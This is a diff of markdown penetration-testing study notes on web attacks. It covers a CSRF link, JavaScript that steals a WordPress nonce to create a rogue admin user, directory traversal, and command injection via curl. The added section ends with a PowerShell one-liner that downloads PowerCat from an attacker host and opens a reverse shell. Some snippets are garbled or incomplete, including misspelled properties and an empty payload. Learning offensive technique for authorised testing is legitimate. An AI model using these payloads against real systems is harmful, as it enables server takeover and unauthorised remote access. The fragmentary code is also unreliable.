@@ -222,9 +222,7 @@ The malicious link could be disguised by an apparently-harmless description, oft
 ~~~ html
 <a href="http://fakecryptonbank.com/send_btc?account=ATTACKER&amount=1000000"">Check out these awesome cat memes!</a>
 																			  ~~~
-
 In order to use an exploit above, we need to obtain the WordPress nonce.
-
 ~~~ js
 // using JS to obtain the WordPress nonce.
 
@@ -236,9 +234,7 @@ ajaxRequest.send();
 var nonceMatch = nonceRegex.exec(ajaxRequest.responceText);
 var nonce = nonceMatch[1];
 ~~~
-
 Now that we have the WP nonce we can craft the main function responsible for creating the new admin users.
-
 ~~~ js
 // creating the new wordpress admin user
 
@@ -248,9 +244,7 @@ ajaxRequest.open("POST", requestURL, true);
 ajaxRequest.setRequestHeader("Content-Type)", "application/x-www-form-urlencoded");
 ajaxRequest.send(params);
 ~~~
-
 Finally we need to encode the minified JavaScript code, so any bad characters wont interfere with sending the payload.  We can do this using the following function.
-
 ~~~ js
 function encode_to_javascript(string){
 	var input = string;
@@ -270,7 +264,6 @@ console.log(encoded)
 In this section, we will understand what a directory traversal vulnerability is, how it can be identified and exploited.  It is also useful to know how to correct the vulnerability.
 ### Absolute and relative paths
 The easiest way to understand the difference between absolute and relative paths is to visualise the location of a file system as if you were in it.  A relative path is the directions that you would take to get from where you are to where you need to be i.e. the directions are based on where you are.  An absolute path is the location/directions to the location you want to go  from the root directory.
-
 ~~~ bash
 # if Im in the home directory "/home/kali" and I want to get to the 'Downloads' direcotry I would use the command below.
 pwd
@@ -499,9 +492,35 @@ For example, we maybe able to use a 'git clone' command in a input field on a we
 We can also try to run arbitrary commands on the web application using the cURL application.
 ~~~ bash
 # using curl to run arbitrary commands
-# -X specify the http request verb
+# -X specify the http request verb POST
 # --data sends the specified data in a POST request to the http server in the same way that a browser does when a html form is completed
 curl -X POST --data 'Archive=ipconfig' http://192.168.0.1:8080/archive
+~~~
+Once we know that we can execute commands via a web application, we need to experiment with how these are being received and run by the OS.  This experimentation needs to include the use of 'URL Encoding'.
+``` bash
+# using url encoded ';' to run two commands (git and ipconfig (windows))
+curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.0.1:8000/archive
+
+# this returns the result of both commands
+
+```
+We can check to see what application is executing the commands (either PowerShell or CMD) by executing the following code snippet with the OS returning either a 'CMD' or 'PowerShell' message.
+~~~ bash
+# the code snippet by its self
+(dir 2>&1 *'|echo CMD);&<# rem #>echo PowerShell
+~~~
+~~~ bash
+# with URL encoding and within the curl command
+curl -X POST --data 'Archive=' http://192.168.0.1:8000/archive
+~~~
+If the result is 'PowerShell'  we can try to obtain system access (reverse shell) using PowerCat.  PowerCat is a PowerShell interpretation of Netcat included in Kali.  The steps for using PowerCat are:
+1.  Copy PowerCat to the home directory;
+2.  Start a Python http server in the same directory (our web server is serving powercat.ps1);
+3.  In a third terminal start a Netcat listener on port 4444; and
+4.  Using cURL inject the following command.
+~~~ bash
+# the reverse shell command
+IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
 ~~~
 ## Tags
 #enumeration
